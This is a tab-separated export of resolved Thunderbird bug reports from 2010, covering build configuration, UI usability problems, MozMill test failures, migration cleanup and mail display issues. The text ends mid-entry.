614918%TAB%1290736018%TAB%130269%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%On Solaris 10, /bin/sh doesn't understand "export LDAP_COMPONENT=mozldap"%TAB%On Solaris 10, /bin/sh doesn't understand "export LDAP_COMPONENT=mozldap"We have to write it in 2 lines to make it compatible with Solaris 10 /bin/sh.
614407%TAB%1290519293%TAB%124707%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Explanation of "reply to" field would be helpful%TAB%Explanation of "reply to" field would be helpfulUser-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7 Build Identifier: 3.1.6  The manage identities>Edit Identity> "Reply to address" section should have a note saying "Leave this blank unless you explicitly want email replies to go to a different address".  Reproducible: Always     I haven't been able to figure out why my name hasn't been appearing in replies I get and deleting the "reply to" address altogether fixed the problem!
614215%TAB%1290484623%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%Add some color to the sidebar under Aero%TAB%Add some color to the sidebar under AeroIt would be good to add some color to the sidebar under aero, similar to what Firefox does for it's bookmark sidebar. Especially since we're landing the changes in bug 545557 and we need to make the difference between the areas more clear.
614205%TAB%1290478492%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Drop unnecessary NECKO_PROTOCOLS_DEFAULT in confvars.sh%TAB%Drop unnecessary NECKO_PROTOCOLS_DEFAULT in confvars.shiirc we used to specify this so we didn't build in things like gopher. However that changed, and there's nothing specific we don't want. In addition, the recently added wyciwyg is not getting built into the build, and this breaks IPC builds of Thunderbird (which I'm working towards).  So I think we should just remove it and use the same that mozilla-central uses.  Also, I'm removing the define for Sunbird just to get it out of the way when searching.
613975%TAB%1290411720%TAB%328198%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Inconsistent Print and Print Preview between File and message context menu%TAB%Inconsistent Print and Print Preview between File and message context menuIn message context menu there is an inconsistency with File menu/Print Preview. When switching to offline mode, message which hasn't been downloaded can be printed (or previewed) from message context menu. This is not possible from File menu and doing so leads to 'lockup' because Thunderbird is trying to download message in offline mode forever.
613965%TAB%1290408899%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Trunk leak test builds busted following mozilla-central changes%TAB%Trunk leak test builds busted following mozilla-central changesmozilla-central landed bug 609976 and bug 611930 together, at which time our trace-malloc builds started failing to run properly.  The best I can gather:  - Only happens on windows (pointing more to bug 609976) - the trace-malloc part of the leak/bloat run is the bit that fails - it just seems extremely slow. - thunderbird.exe seemed to have 0% CPU when I looked at the process on the build machines. - SeaMonkey and Firefox build fine.  My current thoughts:  - Thunderbird builds non-IPC, so there may be some weird interactions there. - Something is up with the test.  Given my limited possibilities, I'm going with disabling static js on windows leak for now and see where that gets us.
613443%TAB%1290118946%TAB%49577%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%MailNews: Composition,Message Compose Window%TAB%msgCompSMIMEOverlay.xul: add 1 |insertbefore="button-save"|,msgCompSMIMEOverlay.xul: remove useless |insertbefore="button-save"|%TAB%msgCompSMIMEOverlay.xul: add 1 |insertbefore="button-save"|,msgCompSMIMEOverlay.xul: remove useless |insertbefore="button-save"|(SeaMonkey) Bug 509209 removed |insertbefore="saveSeparator"|, without replacing it.  http://bonsai.mozilla.org/cvsquery.cgi?module=ThunderbirdTinderbox&sortby=Date&hours=2&date=explicit&mindate=2003-05-08+15%3A41&maxdate=2003-05-08+15%3A41 Thunderbird had replaced it with |insertbefore="button-save"|.  Any reason why SM would not want that too?  This is 1 of the (only) 2 differences which remain between SM and TB.
613435%TAB%1290116321%TAB%49577%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Security%TAB%msgCompSMIMEOverlay.xul: 1 s/observes/command/%TAB%msgCompSMIMEOverlay.xul: 1 s/observes/command/(SeaMonkey) Bug 509209 comment 42: { neil@parkwaycc.co.uk      2009-09-06 13:05:13 PDT  >+              observes="cmd_viewSecurityStatus"/> Would prefer that this got changed to command= if that works. }  This is 1 of the (only) 2 differences which remain between SM and TB.
613195%TAB%1290058934%TAB%98534%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%No keyword detection for missing attachment feature%TAB%No keyword detection for missing attachment featureDiscovered in litmus testing: Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101116 Thunderbird/3.3a1  I see no keyword detection at all. Also on current trunk.
612884%TAB%1289975407%TAB%309770%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Doesn't open Add-ons Manager tab when click [Manage Add-ons...]button in Options dialog%TAB%Doesn't open Add-ons Manager tab when click [Manage Add-ons...]button in Options dialogUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101117 Thunderbird/3.3a2pre Build ID: 20101117033239  Doesn't open Add-ons Manager tab when click [Manage Add-ons...]button in Options dialog, General pane > Add-ons.  Reproducible: Always  Steps to Reproduce: 1. Open Options dialog, Tools > Options > General pane. 2. Click [Manage Add-ons...]button  Actual Results:   Open broken/old Add-ons Manager dialog.   Expected Results:   Open Add-ons Manager tab.   Same results on TB 3.3a1 build1, Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101116 Thunderbird/3.3a1 Build ID: 20101116152258.
612710%TAB%1289917562%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Bugs found during testing of Thunderbird 3.3 Alpha 1 release candidates - (3.3a1)%TAB%Bugs found during testing of Thunderbird 3.3 Alpha 1 release candidates - (3.3a1)Bugs found during testing of Thunderbird 3.3 Alpha 1 release candidates. Please mark them as blocking this bug rather than commenting on them here.
612338%TAB%1289817278%TAB%103593%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer%TAB%Package ConsoleAPI.js%TAB%Package ConsoleAPI.jsAlong with necko_wyciwyg from bug 561085, startupcache from bug 520309, and webapps from bug 590225 (which lacks any actual explanation of _why_ everyone should build it, but it's pretty cheap).
612023%TAB%1289647859%TAB%286107%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Can't open URIs from the command line%TAB%Can't open URIs from the command lineWhen I try doing mozilla/dist/bin/thunderbird -no-remote news:rec.games.pinball, I get an error to the effect that said URI is not a file.  After doing some research, it looks like bug 287345 incorrectly assumed that anything hitting that statement was a file and not a URI.  I believe this impacts shell integration for Linux, but I can't say about Windows or Mac OS X.
611697%TAB%1289549141%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Set up unofficial branding for Miramar%TAB%Set up unofficial branding for MiramarReady for Alpha 1, I want to get the Miramar branding set up. At the moment we don't have a logo yet, so we'll use the Shredder branding, but call it Miramar.  The attached patch basically makes the mail/branding/unofficial directory the same as the mail/branding/nightly directory except for the appropriate strings.
611305%TAB%1289453204%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Release Engineering,Build Config%TAB%Update Linux 32 & 64 bit builders to use GCC 4.5,Update Thunderbird's Linux 32 & 64 bit builders to use GCC 4.5 on comm-central and comm-aurora%TAB%Update Linux 32 & 64 bit builders to use GCC 4.5,Update Thunderbird's Linux 32 & 64 bit builders to use GCC 4.5 on comm-central and comm-auroraPer bug 559964 we should upgrade our Linux builders to GCC 4.5. Although we're not going to use PGO at the moment, I'd prefer to keep these in sync.
610603%TAB%1289259209%TAB%83455%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Message Reader UI%TAB%mailnews.headers.showMessageId doesn't show the Message-ID unless you click on '+'%TAB%mailnews.headers.showMessageId doesn't show the Message-ID unless you click on '+'User-Agent:       Mozilla/5.0 (Windows NT 6.0; rv:2.0b6) Gecko/20100101 Firefox/4.0b6 Build Identifier:   If you set mailnews.headers.showMessageId true it displays "message-id + 1" (without the quotes) in the message view pane. Same problem if you view the message in a tab or window. If you click on the plus sign it replaces "+ 1" with a dash and the contents of the Message-ID: header. It is not a sticky setting, you have to click on the plus sign for every message. It is supposed to show the full header without you having to click on anything (there is only one value, and its length shouldn't be a problem).   mailnews.headers.showUserAgent works correctly so I assume this problem is specific to mailnews.headers.showMessageId. I also tested using a Thunderbird 3.3a1pre ID:20101104032801 nightly build and it had the same problem.    Reproducible: Always
610065%TAB%1288970583%TAB%5189%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%Add src parameter to AMO API pings%TAB%Add src parameter to AMO API pingsI think you guys will want to port bug 602367 that added a src parameter to AMO requests. That bug stated that adding ?src=thunderbird for you is the right thing.
609996%TAB%1288961382%TAB%288265%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%search.xml autocomplete needs tweak to be cleanly extensible%TAB%search.xml autocomplete needs tweak to be cleanly extensibleadd-ons can insert completers in glautocomp.js, and it works beautifully. The only problem is that the observer in search.xml expects that the completion result is one of the built-in ones.  An add-on can register another observer for the autocomplete-did-enter-text notification and handle it.  However, the search.xml observer will complain if the row object doesn't have a nounDef for example.  Proposed patch attached.
609941%TAB%1288951795%TAB%287836%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%Gloda search completed stopped finding anything,Tags with the names of Object-provided attributes break the faceted search UI.%TAB%Gloda search completed stopped finding anything,Tags with the names of Object-provided attributes break the faceted search UI.User-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-GB; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 Build Identifier: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13pre) Gecko/20101104 Lanikai/3.1.7pre  If I type anything into the Search bar (including very common terms) it opens the new tab (as usual) and puts up the "Searching" animation but does not find anything.  This has just started happening, and I'm not aware of anything else that could cause it.  I will leave trying to fix it (e.g. by deleting indexes) for a couple of days in case someone wants me to do any tests to see what is damaged.    Reproducible: Always
609926%TAB%1288949283%TAB%49577%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%'Quote Message' menuitem activation misbehaves%TAB%'Quote Message' menuitem activation misbehavesI verified this bug in both SM 2.1b2 and TB 3.3a1.  Bug 607583 comment 0: { Serge Gautherie (:sgautherie)      2010-10-27 03:17:50 PDT  http://bonsai.mozilla.org/cvsquery.cgi?module=ThunderbirdTinderbox&sortby=Date&hours=2&date=explicit&mindate=2003-08-03+23%3A36&maxdate=2003-08-03+23%3A36 "Add a new quote button for quoting the selected message like Netscape 4.x" }  Bug 607583 comment 3: { neil@parkwaycc.co.uk      2010-11-05 04:21:52 PDT  If you start by composing a new message, then open the 3pane window and select a message, the quote message menuitem remains disabled.  If you reply to a message, then close the 3pane window, the quote message menuitem remains enabled.  In both cases you can work around it by clicking in and out of the message body. }
609245%TAB%1288749020%TAB%398514%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%usability problem: address book may seem "gone" after accidentally collapsing "address books" pane,usability problem: address book may seem "gone" after accidentally collapsing "address books" pane - need min size on AB sub-pane,usability problem:  folder and address book panes may seem "gone" after accidentally collapsing them%TAB%usability problem: address book may seem "gone" after accidentally collapsing "address books" pane,usability problem: address book may seem "gone" after accidentally collapsing "address books" pane - need min size on AB sub-pane,usability problem:  folder and address book panes may seem "gone" after accidentally collapsing themUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.12) Gecko/20101027 Lightning/1.0b2 Thunderbird/3.1.6  In the address book window the "address books" pane on the left will suddenly collapse when dragging the vertical splitter to the left.  If this happens accidentally, especially while the user is not paying much attention, the address books appear to gone because the splitter looks just like part of an unusually wide window border. It does not indicate function. And even worse: This UI setting is remembered, so closing an re-opening the window does not help.  It seems natural to review the "view" menu in this case, but it offers no command to restore the address books pane.  For a user who is not actively maintaining his/her address books, the problem is aggravated by the fact that the first default address book "personal addresses" may be empty and all addresses are stored in "collected addresses". As the first address book is always selected when opening the address books window (regardless of the last selected book), it might appear to the user that all addresses are simply gone.  Reproducible: Always  Steps to Reproduce: 1. open address book window 2. drag vertical splitter to the left beyond the point at which the address books pane instantly collapses Actual Results:   Address books appear to be gone and there is no menu command to make them reappear  Expected Results:   Address books pane should not collapse completely. Or if it has to: - This should happen smoothly, not with an instant snap of the splitter to the left. - The splitter, being at the far left, should have a strong visual cue that something is hidden and can be made to reappear by clicking/dragging. - There should be a command in the view menu to toggle th address books pane visibility.  The described problem occurred to my girlfriend. After she complained to me that "all my addresses are gone", I investigated and it took me - as a software developer and long-time Thunderbird user - several minutes to spot the splitter in the far left (btw: the window was maximized, which makes it even harder to spot).  Others might be driven to reinstall Thunderbird, restore their profile from a backup or whatever.
608993%TAB%1288681822%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Remove final uses of commonDialog following m-c changes%TAB%Remove final uses of commonDialog following m-c changesLooks like m-c removed the wrappers we used to use so here's a patch to remove all of them.
608981%TAB%1288680045%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Enable building of places in Thunderbird, but disable history by default%TAB%Enable building of places in Thunderbird, but disable history by defaultTo move the Thunderbird build closer to Firefox, and to easily enable interesting things like favicons for content tabs, we should start building places. Extensions should also be able to use it if they wish to.  I can't see a reason at the moment for us to enable storing of history by default, so I think we should disable it by default but keep reasonable defaults in place. I believe that favicon storing/usage will still work even if the history is disabled (I think it relies on other prefs).
608638%TAB%1288538369%TAB%135518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%Get rid of the Netscape 4.x profile migration%TAB%Get rid of the Netscape 4.x profile migrationOdds are fair that it's broken.  We know it's crashy, since the only evidence we have of anyone using it in living memory was bug 458973.  We know having it in the wizard is a trap for the unwary, from bug 432850.  It's probably even more broken in localized builds, since http://mxr.mozilla.org/l10n-mozilla1.9.2/search?string=maildirname doesn't really look like the notes for mailDirName and newsDirName were sufficient to explain that you needed to install 4.5 and 4.7 on all platforms in your locale (a bit of a (pointless) challenge since 4.x was PPC pre-OS X, so the one place that we know that mailDirName mattered, JA Mac, there is zero possibility of a direct migration from Netscape 4.x to Tb 3.next, but determining how to make migration work for someone who manually copied around a profile would require buying a computer which is no longer for sale) and determine what localized name or names they used.  Having it around has four effects on us that I can see:  * we have to do tree-wide changes to untested and untestable code * things like Coverity are checking untested, untestable, probably unused code * it confuses us, because we continually think that we already removed it * it keeps alive long-dead and always-dead prefs in mailnews.js and all-thunderbird.js, because it confuses us into thinking that things like mail.server_type are not totally unused
608278%TAB%1288334360%TAB%288265%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Changes to make Thunderbird fit in with Ubuntu's Unity%TAB%Changes to make Thunderbird fit in with Ubuntu's UnityUbuntu is switching the default shell to Unity in desktop editions in 11.04 (Natty).  Talking to Ubuntu folks at UDS-N, we discussed what changes need to happen in Thunderbird to fit in to the new shell.  This is a meta bug.  We'll file dependent bugs for each bit.  For context though, the broad strokes are:   - Unity has a global menu rather than in-window menu (similar to what OS X does).  Thunderbird should use that menu when run under Unity.  Note that the shell can be chosen at runtime, so compile time decisions aren't appropriater here (unlike the mac).   - Unity includes a task list for each app that registers in the dock.  Thunderbird should register tasks (and there are different tasks possible when the app is running and not).  This is likely related from the TB point of view to Windows 7 jump lists.   - Unity includes a single messaging menu in the top right (in LTR locales), which all messaging apps should use to communicate things like number of new messages, etc.  Thunderbird should integrate there as well.  Note that AFAICT the way to do this is to talk via DBUS, which will likely require changes in mozilla-central, such as integration in the gtk event loop, etc.  (We should find whatever bug currently tracks that work).  (this meta-bug does not attempt to address non-Unity related Ubuntu integration issues like integration with contacts, etc., which should be tracked in other bugs).
607295%TAB%1288070100%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Provide UI for new archive granularity option,Provide UI for new archive granularity and folder structure options%TAB%Provide UI for new archive granularity option,Provide UI for new archive granularity and folder structure optionsOriginally I had opened bug 517514 for this, but it ended up only taking care of backend changes from server-specific to per-identity setting, hence I'm opening this bug as a clone to actually take care of the actual user interface.  (Quoting bug 517514 comment #0) > +++ This bug was initially created as a clone of Bug #486827 +++ >  > Spun off per bug 486827 comment #19 to provide an easier access to the > archive_granularity attribute for a server. A possible location would be > the Copies & Folders page of the Account Manager, e.g., as a drop-down > menu right underneath the selector for the Archives folder location. >  > Possible values of archive_granularity: >  > 0 = Flat archive (no subfolders) > 1 = subfolders in Archives for year (1-level structure, default) > 2 = subfolders for year, then for month (2-level structure)  With a draft patch by mkmelin in attachment 407331 [details] [diff] [review] (screenshot provided in attachment 403820 [details]) which could be used as starting point.   After some discussion, the following more comprehensive idea from clarkbw:  (Quoting bug 517514 comment #6) > I was going to suggestion a new dialog window for this.  For reasons of having > more room to explain the choices given as well as giving space for extensions > to offer alternate archiving patterns. >  > Basic proposal would be this: >  > * replace the Archive Hierarchy radios with an ( Archive Options... ) button >  > * create new dialog window with the radio buttons and examples near by. >  > +-------------------------------+ > | > | (o) Flat Folder > |     /Archives/ > | > | (o) Yearly Archived Folders > |     /[-] Archives/ > |       |--- 2009 > |       +--- 2008 > | > | (o) Yearly Archived Folders > |     /[-] Archives/ > |       |--[-] 2009 > |       |   |--- 2 > |       |   +--- 1 > |       +--[-] 2008 > |           |--- 12 > |           +--- 11 > | > +-------------------------------+ >  > I think we might actually want the examples beside the radio buttons but that > was harder to do in ascii art.  For these types the examples could all be done > in JS such that the year and folder are close to current. >  > Future Archive schemes provided via extensions could just append to that dialog > for their options.
607265%TAB%1288056528%TAB%258002%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%"mailnews.use_received_date" pref is no longer used, should be removed%TAB%"mailnews.use_received_date" pref is no longer used, should be removedUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.11) Gecko/20101019 Lightning/1.0b2 Thunderbird/3.1.5  http://groups.google.com/group/mozilla.dev.apps.thunderbird/browse_thread/thread/7fbf7942799162bd  Reproducible: Always
606934%TAB%1287977570%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%We don't register Thunderbird as the default .eml handler,We don't register Thunderbird as the default .eml handler on linux%TAB%We don't register Thunderbird as the default .eml handler,We don't register Thunderbird as the default .eml handler on linuxSTR :  1) install TB - make Tb the default client 2) create an account 3) Save an email from the account 4) close TB 5) double click on saved email  Mail.app starts
606440%TAB%1287708482%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Fix errors in error messages in MozMill tests%TAB%Fix errors in error messages in MozMill testsIn trying to implement omnijar, I was hitting a couple of errors that were producing errors in themselves.  The attached patch fixes these.
606436%TAB%1287706795%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Fix incorrect references to resource://app/... in the feature configurators%TAB%Fix incorrect references to resource://app/... in the feature configuratorsAs discovered in bug 601573 we've a few instances of references to resource://app/... in featureConfigurators, and these should be replaced by resource:///  The attached patch should fix the issue.
606327%TAB%1287664288%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Investigate updating Thunderbird to the latest MozMill%TAB%Investigate updating Thunderbird to the latest MozMillMozMill 1.5.1 is soon to be released so we should consider upgrading. However, I really want to upgrade because it contains a fix whereby we can correctly run 32/64 bit universal binaries on 10.5 and 10.6.  With our current efforts to get 64 bit builders running, having packaged tests run on both platforms would give us a lot more confidence in the two.  I've updated my local copy to the latest git version (probably 7eedd5e23b8bc8751b6cba3d1e6a99e95570a576).  It fails to run mozmill - there's obviously some changes in place.  I have a work in progress patch (see attached), but at the moment, I can't seem to get it past ThunderTestCLI.__init_():  Traceback (most recent call last):   File "runtest.py", line 396, in <module>     ThunderTestCLI(args=sys.argv[1:]).run()   File "runtest.py", line 280, in __init__     mozmill.CLI.__init__(self, args)   File "/Users/moztest/comm/mozmill/mozmill/mozmill/mozmill/__init__.py", line 493, in __init__     handler = handlers.instantiate_handler(cls, self.options)   File "/Users/moztest/comm/mozmill/mozmill/mozmill/mozmill/handlers.py", line 31, in instantiate_handler     args = argspec.args[1:] # don't need to pass self AttributeError: 'tuple' object has no attribute 'args'  Help/advice/patches welcome.
605381%TAB%1287432121%TAB%135518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Remove comm-central uses of long-dead class sortDirectionIndicator%TAB%Remove comm-central uses of long-dead class sortDirectionIndicatorAs bug 605089 notes, class="sortDirectionIndicator" has been meaningless since before Mozilla 1.0, lending an extra measure of pointlessness to the (copy-pasted) mail/ uses.
604855%TAB%1287173629%TAB%114487%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Tabbing from subject to body adds a tab in the body%TAB%Tabbing from subject to body adds a tab in the bodyUser-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 Build Identifier: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.11) Gecko/20101004 Lightning/1.0b2 Thunderbird/3.1.5  This looks like its new in 3.1.5, in the composition window if you tab thru the fields a tab character will be added to the body when you jump to the body from the subject.  Reproducible: Always  Steps to Reproduce: 1.create message 2.click to subject 3.tab to body Actual Results:   tab added to the body of the email  Expected Results:   Nothing should be added to the body of the message until that field has focus
604359%TAB%1287032839%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Switch more character encodings to better default fonts%TAB%Switch more character encodings to better default fontsThis is a followup to bug 465633. See <http://groups.google.com/group/mozilla.dev.l10n/browse_thread/thread/4d786169e6bb3aa1> and <https://mail.mozilla.org/pipermail/tb-planning/2010-October/000530.html>. Baltic and Greek seem ok going by the m.d.l10n thread, and I've optimistically switched the others too.  (Note that if you run the test in isolation on Windows you'll hit bug 604406 and will need the patch there.)
603733%TAB%1286880875%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Mozmill: permanent failure with a few quick-filter-bar tests%TAB%Mozmill: permanent failure with a few quick-filter-bar testsWe've been seeing failures of the following sort on WINNT 5.2 comm-central check for the past few days.  <http://tinderbox.mozilla.org/showlog.cgi?log=Thunderbird/1286906666.1286911431.1550.gz>  TEST-UNEXPECTED-FAIL | e:\buildbot\win32-comm-central-check\build\mail\test\mozmill\quick-filter-bar\test-keyboard-interface.js | test_escape_rules TEST-UNEXPECTED-FAIL | e:\buildbot\win32-comm-central-check\build\mail\test\mozmill\quick-filter-bar\test-toggle-bar.js | test_direct_toggle TEST-UNEXPECTED-FAIL | e:\buildbot\win32-comm-central-check\build\mail\test\mozmill\quick-filter-bar\test-toggle-bar.js | test_control_f_triggers_display TEST-UNEXPECTED-FAIL | e:\buildbot\win32-comm-central-check\build\mail\test\mozmill\quick-filter-bar\test-toggle-bar.js | test_constraints_disappear_when_collapsed  This is probably due to m-c, as I had to rebuild entirely to reproduce the failure.
603438%TAB%1286795064%TAB%368051%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%sl / Slovene,Mail Window Front End%TAB%Are these BCC & Co localization notes to be taken seriously?%TAB%Are these BCC & Co localization notes to be taken seriously?It is TB, files /mail/chrome/messenger/mime.properties and mimeheader.properties  http://hg.mozilla.org/releases/l10n-mozilla-1.9.2/sl/diff/f791b41b8768/mail/chrome/messenger/mime.properties http://hg.mozilla.org/releases/l10n-mozilla-1.9.2/sl/diff/ff4b54422eb7/mail/chrome/messenger/mime.properties http://hg.mozilla.org/releases/l10n-mozilla-1.9.2/sl/diff/f791b41b8768/mail/chrome/messenger/mimeheader.properties http://hg.mozilla.org/releases/l10n-mozilla-1.9.2/sl/diff/ff4b54422eb7/mail/chrome/messenger/mimeheader.properties  Please note that BCC, CC etc are as central to the application as "File" is to say Firefox.  There's only two possibilities: a) They must be taken seriously, not because "it says so", but for some reason in the code. In this case the code must corrected PDQ to eliminate this kind of language dependence.  or  b) there's no reason for not localizing the entries. The comments should be corrected, so that there's no more room for misunderstanding.
603391%TAB%1286785472%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Rename tabmail.closeTabs to something more sensible%TAB%Rename tabmail.closeTabs to something more sensiblePer <https://mail.mozilla.org/pipermail/tb-planning/2010-October/000527.html>. I don't care about the name too much (anything's better than closeTabs), but _teardown is short, sweet and descriptive.
602531%TAB%1286434922%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Change "-moz-box-shadow" to "box-shadow" in mail/%TAB%Change "-moz-box-shadow" to "box-shadow" in mail/-moz-box-shadow is obsolete in Gecko 2.0, so we should rename it to box-shadow. This was done for suite in Bug 595630.
601926%TAB%1286254338%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Search%TAB%Investigate making the timeline of faceted search RTL friendly,Make the timeline of faceted search RTL friendly%TAB%Investigate making the timeline of faceted search RTL friendly,Make the timeline of faceted search RTL friendlyWith the new RTL faceted search, the timeline is still not RTL, it felt weird, but I'm not a RTL heavy user so I don't know what the best practice is.
601900%TAB%1286241700%TAB%395718%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%copy messages to imap folder stops without any message - copy to no reaction,copy messages to imap folder stops without any error message - copy to no reaction - due to insufficient return checks%TAB%copy messages to imap folder stops without any message - copy to no reaction,copy messages to imap folder stops without any error message - copy to no reaction - due to insufficient return checksUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 ( .NET CLR 3.5.30729) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.9) Gecko/20100915 Lightning/1.0b2 Thunderbird/3.1.4  When copying messages or folders to an imap folder the following message appears at the bottom of the window: "Copying Message xx of yy to folder" Thunderbird is never copying all the messages an is never coming to the end of the job, but stops by chance at any message (except if you copy only a few messages and it pass by chance) It is the same result buy drag and drop or using the right click on the mouse. After abandoning the job, it's impossible to copy the same job again, no reaction. You can copy the same files to any other directory but not twice in one directory, even after deleting messages or folder. If you want to copy again you have to restart TB.  The problem persists under Windows XP and Windows 7. Trying with an identical version under Linux, it seems that there is no problem  Windows Mail, Outlook Express are doing the job fine  Reproducible: Always  Steps to Reproduce: 1. copy messages to an imap folder from local folder oder other imap server 2. copying stops after a certain number of messages copied 3. impossible to copy some other messages to the same folder without restarting TB    The imap-server contacting is dovecot 1.0 and dovecot 2.0 (no special report in the logs) I tried it also with uw-imapd - same result  I will classify the problem as critical because if you don't check that all messages are on the server before deleting local copy you will loose your messages.
601593%TAB%1286163204%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%Remove some usages of nsVoidArray in the migration code and share functions between classes%TAB%Remove some usages of nsVoidArray in the migration code and share functions between classesThis patch is based on something I did for SM when I first wrote their migration code.  The patch moves some duplicated functions from nsDogbertProfileMigrator and nsSeaMonkeyProfileMigrator, combines them into nsNetscapeProfileMigratorBase and then fixes the inheritance so that it works nicely.  I've also done the change of mFileCopyTransactions from nsVoidArray to nsTArray.
601573%TAB%1286154611%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Support omnijar in Thunderbird%TAB%Support omnijar in ThunderbirdBug 556644 and others implemented omnijar support for Firefox, we should do the same for Thunderbird. Bug 601571 is adding the required comm-central build-config changes, this bug will do the specific app changes.
601206%TAB%1285927780%TAB%120380%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Some email addresses are truncated in headers%TAB%Some email addresses are truncated in headersLong lists of email addresses are truncated when viewing an email, see the screenshot, and notice what happened to newlib@sourceware.org.
601071%TAB%1285888904%TAB%395500%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Mail Window Front End,Backend,Message Compose Window,Message Reader UI,Backend,Message Reader UI%TAB%Thunderbird will not load images in emails despite having clicked "Show Remote Content from this user",Thunderbird will not load images in emails despite having clicked "Show Remote Content from this user" issue with Quoted-printable%TAB%Thunderbird will not load images in emails despite having clicked "Show Remote Content from this user",Thunderbird will not load images in emails despite having clicked "Show Remote Content from this user" issue with Quoted-printableUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.9) Gecko/20100915 Thunderbird/3.1.4  When I open up an email in HTML format, none of the images load or display, yet they did previously. The yellow bar asking me to show remote content does not display in emails at all any more and I cannot work out how to enable the images to show in 3.1.4 or why this issue is occuring. It would appear that the HTML source is being re-written, which is putting "3D" in front of the HTML tags. For example <img src="test.jpg" /> would show up as <img src=3D"test.jpg3D" />  Reproducible: Always  Steps to Reproduce: 1. Load FileZilla 2. Open up an email inbox 3. Launch an email Actual Results:   Images did not display  Expected Results:   Shown the images in the 